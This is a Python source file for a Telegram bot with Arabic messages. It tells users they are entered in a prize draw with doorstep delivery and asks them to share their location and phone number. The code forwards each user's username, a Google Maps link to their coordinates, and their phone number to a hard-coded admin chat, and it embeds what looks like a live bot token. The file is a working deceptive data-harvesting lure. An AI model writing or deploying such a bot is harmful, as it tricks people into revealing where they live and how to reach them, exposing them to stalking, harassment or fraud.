import telebot
from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton, Contact, InlineKeyboardMarkup, InlineKeyboardButton

# Replace with your bot's token
bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")

@bot.message_handler(commands=['start'])
def start(message):
    # Send a welcome sticker
    bot.send_sticker(message.chat.id, 'CAACAgIAAxkBAAEEDjtkXPE4QwABt1XdsL3LzWHTY6HfE-wAAn4AA1advwAB0L3xUqqmW9spBA')
    
    # Create a reply keyboard with buttons for sharing location and contact
    keyboard = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    location_button = KeyboardButton(text="📍 شارك موقعك الآن للحصول على فرصة للفوز", request_location=True)
    contact_button = KeyboardButton(text="📞 شارك رقم هاتفك", request_contact=True)
    keyboard.add(location_button, contact_button)

    # Send a message to the user with the keyboard
    bot.send_message(message.chat.id, """
🎉 | أهلاً وسهلاً بك ! 
🎁 | أنت الآن في سحب على جائزة قيمة ! 
📍 قم بإرسال الموقع ورقم الهاتف للمشاركة في السحب. سنقوم بتسليم الجائزة مباشرة إلى باب منزلك من قبل فريق التوصيل 💨🚚
""", reply_markup=keyboard)

@bot.message_handler(content_types=['location'])
def get_location(message):
    # Get the user's location
    latitude = message.location.latitude
    longitude = message.location.longitude

    # Create a URL for Google Maps with the user's location
    google_maps_url = f"https://www.google.com/maps/place/{latitude},{longitude}"

    # Get the user's username
    username = message.from_user.username or "مستخدم غير معروف"

    # Create a message with the user's username and Google Maps URL
    location_message = f"اسم المستخدم: {username}\nشارك موقعه: {google_maps_url}"

    # Replace with the admin's chat id
    admin_chat_id = "1051175859"

    # Send the location message to the admin
    bot.send_message(admin_chat_id, location_message)

    # Send a confirmation message to the user
    bot.send_message(message.chat.id, "📍 تم استلام موقعك بنجاح! شكراً لمشاركتك.")

@bot.message_handler(content_types=['contact'])
def get_contact(message):
    # Get the user's contact
    phone_number = message.contact.phone_number

    # Get the user's username
    username = message.from_user.username or "مستخدم غير معروف"

    # Create a message with the user's username and phone number
    contact_message = f"اسم المستخدم: {username}\nشارك رقم هاتفه: {phone_number}"

    # Replace with the admin's chat id
    admin_chat_id = "YOUR_ADMIN_CHAT_ID"

    # Send the contact message to the admin
    bot.send_message(admin_chat_id, contact_message)

    # Send a confirmation message to the user
    bot.send_message(message.chat.id, "📞 تم استلام رقم هاتفك بنجاح! شكراً لمشاركتك.")

# Start the bot
bot.polling()
